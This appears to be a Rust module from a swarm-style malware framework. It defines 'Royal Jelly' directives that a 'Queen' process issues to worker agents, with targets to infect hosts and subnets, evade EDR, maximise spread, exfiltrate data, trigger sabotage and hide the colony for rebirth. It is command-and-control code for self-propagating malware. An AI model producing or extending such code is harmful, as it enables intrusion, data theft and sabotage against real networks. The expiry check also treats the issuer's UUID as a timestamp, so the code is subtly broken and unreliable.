// Royal Jelly: Queen directives that shape colony behavior.
// The Queen produces high-priority strategic guidance.
// Workers prioritize royal-jelly-marked targets above all else.

use crate::ldc::{Message, Role, Value};
use uuid::Uuid;
use std::collections::HashMap;

/// Royal Jelly directive from the Queen.
#[derive(Debug, Clone)]
pub struct RoyalJelly {
    pub directive_id: Uuid,
    pub priority: f32,       // 0.0-1.0, higher = more urgent
    pub target_type: JellyTarget,
    pub ttl_seconds: u64,    // expires after this
    pub issued_by: Uuid,
}

#[derive(Debug, Clone)]
pub enum JellyTarget {
    Host(String),             // infect this specific host
    Subnet(String),           // prioritize this subnet
    Service { host: String, port: u16 },  // target this service
    FileType(String),         // prioritize these file types
    AvoidEDR,                 // avoid all EDR-protected hosts
    MaximizeSpread,           // spread as fast as possible
    GoSilent,                 // cease all operations
    ExfiltrateNow,            // dump all collected data
    SabotageIntegrity,        // activate Saboteur bees
    Tournament { competitors: usize, generations: usize },  // darwinian tournament
    HiveMindActivation,       // activate decentralized consensus control
    PhoenixProtocol,          // fragment and hide colony genome for rebirth
}

impl RoyalJelly {
    /// Convert to an LdC belief that all agents understand.
    pub fn to_belief(&self, queen_id: Uuid) -> Message {
        let value = match &self.target_type {
            JellyTarget::Host(h) => Value::String(format!("host:{}", h)),
            JellyTarget::Subnet(s) => Value::String(format!("subnet:{}", s)),
            JellyTarget::Service { host, port } => Value::String(format!("svc:{}:{}", host, port)),
            JellyTarget::FileType(ft) => Value::String(format!("files:{}", ft)),
            JellyTarget::AvoidEDR => Value::String("avoid_edr".into()),
            JellyTarget::MaximizeSpread => Value::String("max_spread".into()),
            JellyTarget::GoSilent => Value::String("go_silent".into()),
            JellyTarget::ExfiltrateNow => Value::String("exfil_now".into()),
            JellyTarget::SabotageIntegrity => Value::String("sabotage_integrity".into()),
            JellyTarget::Tournament { competitors, generations } =>
                Value::String(format!("tournament:{}:{}", competitors, generations)),
            JellyTarget::HiveMindActivation => Value::String("hivemind_activate".into()),
            JellyTarget::PhoenixProtocol => Value::String("phoenix_protocol".into()),
        };

        Message::belief(
            queen_id, Role::Queen,
            format!("royal_jelly:{}", self.directive_id),
            value,
            self.priority,
        )
    }
}

/// Royal Jelly manager: stores active directives with TTL.
pub struct JellyManager {
    pub directives: HashMap<Uuid, RoyalJelly>,
}

impl JellyManager {
    pub fn new() -> Self { Self { directives: HashMap::new() } }

    pub fn issue(&mut self, jelly: RoyalJelly) -> Uuid {
        let id = jelly.directive_id;
        self.directives.insert(id, jelly);
        id
    }

    pub fn get_active(&self, now_secs: u64) -> Vec<&RoyalJelly> {
        self.directives.values()
            .filter(|j| now_secs < j.issued_by.as_u64_pair().0 + j.ttl_seconds as u64)
            .collect()
    }

    pub fn get_highest_priority(&self) -> Option<&RoyalJelly> {
        self.directives.values()
            .max_by(|a, b| a.priority.partial_cmp(&b.priority).unwrap())
    }
}
